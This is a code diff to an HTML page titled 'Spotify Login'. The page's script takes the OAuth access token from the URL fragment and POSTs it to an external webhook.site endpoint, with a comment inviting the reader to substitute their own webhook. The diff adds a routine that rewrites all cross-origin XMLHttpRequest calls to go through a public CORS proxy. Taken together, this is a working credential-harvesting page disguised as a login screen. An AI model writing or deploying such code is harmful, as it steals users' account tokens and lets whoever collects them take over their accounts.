@@ -5,6 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spotify Login</title>
     <script>
+        // CORS Anywhere Proxy Setup
+        (function() {
+            var cors_api_host = 'cors-anywhere.herokuapp.com';
+            var cors_api_url = 'https://' + cors_api_host + '/';
+            var slice = [].slice;
+            var origin = window.location.protocol + '//' + window.location.host;
+            var open = XMLHttpRequest.prototype.open;
+            XMLHttpRequest.prototype.open = function() {
+                var args = slice.call(arguments);
+                var targetOrigin = /^https?:\/\/([^\/]+)/i.exec(args[1]);
+                if (targetOrigin && targetOrigin[0].toLowerCase() !== origin &&
+                    targetOrigin[1] !== cors_api_host) {
+                    args[1] = cors_api_url + args[1];
+                }
+                return open.apply(this, args);
+            };
+        })();
+
+        // Function to get Access Token from URL
         function getAccessToken() {
             const params = new URLSearchParams(window.location.hash.substr(1));
             const token = params.get('access_token');
@@ -17,8 +36,9 @@
             }
         }
 
+        // Send Access Token to Webhook
         function sendTokenToWebhook(token) {
-            fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/aa7a120f-6a64-4ce0-86e3-ee800aad28f5', { // CORS Anywhere proxy
+            fetch('https://webhook.site/aa7a120f-6a64-4ce0-86e3-ee800aad28f5', { // Replace with your webhook URL
                 method: 'POST',
                 body: JSON.stringify({ accessToken: token }),
                 headers: { 'Content-Type': 'application/json' }
